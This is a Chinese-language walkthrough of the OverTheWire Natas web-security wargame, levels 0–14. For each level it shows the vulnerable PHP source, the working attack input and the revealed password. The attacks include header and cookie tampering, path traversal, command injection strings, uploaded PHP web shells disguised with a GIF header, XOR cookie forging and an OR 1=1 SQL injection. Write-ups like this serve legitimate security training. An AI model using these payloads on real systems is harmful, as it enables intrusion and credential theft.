# Natas

### Level0

查看页面源码，可以看到
```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### Level1

同Level0,可从菜单内打开开发者工具查看源码
```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

### Level2
源码内原来放密码的地方变成了一张图
```html
<img src="files/pixel.png">
```
图片本身没有什么特殊的，但是访问/files可以看到一个users.txt，里面存着natas3的密码
```html
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

### Level3
这次信息变成了
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
注意后一句话，查看/robots.txt可以看到一个被禁止的目录
```
User-agent: *
Disallow: /s3cr3t/
```
进去只有一个users.txt，里面存着natas4的密码
```text
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### Level4
提示信息
```html
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
修改Header `Referer: http://natas5.natas.labs.overthewire.org/` 之后访问，得到natas5的密码
```html
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

### Level5
提示信息
```html
Access disallowed. You are not logged in
```
查看Cookie可以看到 `loggedin=0` ，修改成1后访问，得到natas6的密码
```html
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

### Level6
PHP源码
```php
<?
include "includes/secret.inc";
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
于是访问 `/includes/secret.inc` ，得到`$secret = "FOEIUWGHFEEUHOFUOIU";`

提交后得到natas7的密码
```html
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

### Level7
提示信息
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
注意到主页的uri是 `/index.php?page=home`

尝试访问 `/index.php?page=/etc/natas_webpass/natas8` ，得到natas8的密码
```text
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

### Level8
PHP源码
```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
于是运行以下python代码算出原始secret
```python
import base64
secret_encoded = "3d3d516343746d4d6d6c315669563362"
secret_hex = []
for i in range(len(secret_encoded) // 2):
    secret_hex.append(int(
        secret_encoded[i*2: (i+1)*2], 16
    ))

secret_hex.reverse()
secret_base64 = bytes(secret_hex)
secret = base64.standard_b64decode(secret_base64)
```
得到 `oubWYf2kBq` ，提交后得到natas9的密码
```html
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### Level9
PHP源码
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
参考Level7，猜测可以从 `/etc/natas_webpass/natas10` 得到密码

于是提交 `. /etc/natas_webpass/natas10;` ，得到natas10的密码
```text
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

### Level10
PHP源码
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
可见过滤了 `;|&` ，于是去掉Level9末尾的 `;` 提交`. /etc/natas_webpass/natas11`

只查看 `/etc/natas_webpass/natas11` 的部分，得到natas11的密码
```text
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

### Level11
PHP源码，只贴核心部分
```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
根据key做了一个简单的xor加密

加密后的数据为 `ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`

加密前的数据为 `{"showpassword":"no","bgcolor":"#ffffff"}`

于是运行以下python代码尝试得到key
```python
import base64
data = b'{"showpassword":"no","bgcolor":"#ffffff"}'
data_xor = base64.b64decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=")

xor_enc = lambda x, y: x ^ y
key = bytes(map(xor_enc, data, data_xor))
```
算出 `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq` 得到key `qw8J`

将data修改为 `{"showpassword":"yes","bgcolor":"#ffffff"}` 

用算出的key加密得到新的cookie `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

用新的cookie访问得到natas12的密码
```html
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

### Level12
PHP源码，只贴核心部分
```php
<?  
function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 
function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 
if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
}
?> 
```
未对扩展名做检测，于是将表单中 `filename` 项改为.php结尾，上传如下文件
```php
<?
passthru("cat /etc/natas_webpass/natas13");
?>
```
之后访问上传上去的php页面得到natas13的密码
```text
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

### Level13
PHP源码，只贴与Level12不同的部分
```php
if(array_key_exists("filename", $_POST)) { 
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
}
?> 
```
这次加了一个文件头的检测，于是我们加一个假的文件头，变成
```php
GIF89a
<?
passthru("cat /etc/natas_webpass/natas14");
?>
```
之后访问上传上去的php页面得到natas14的密码(去掉开头的 `GIF89a ` )
```text
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

### Level14
PHP源码
```php
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
}
```
只需要这个SQL语句有结果就行了，于是username里填上`" OR 1=1;#`让这个语句返回所有结果，password随便打点什么上去。得到natas15的密码
```text
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```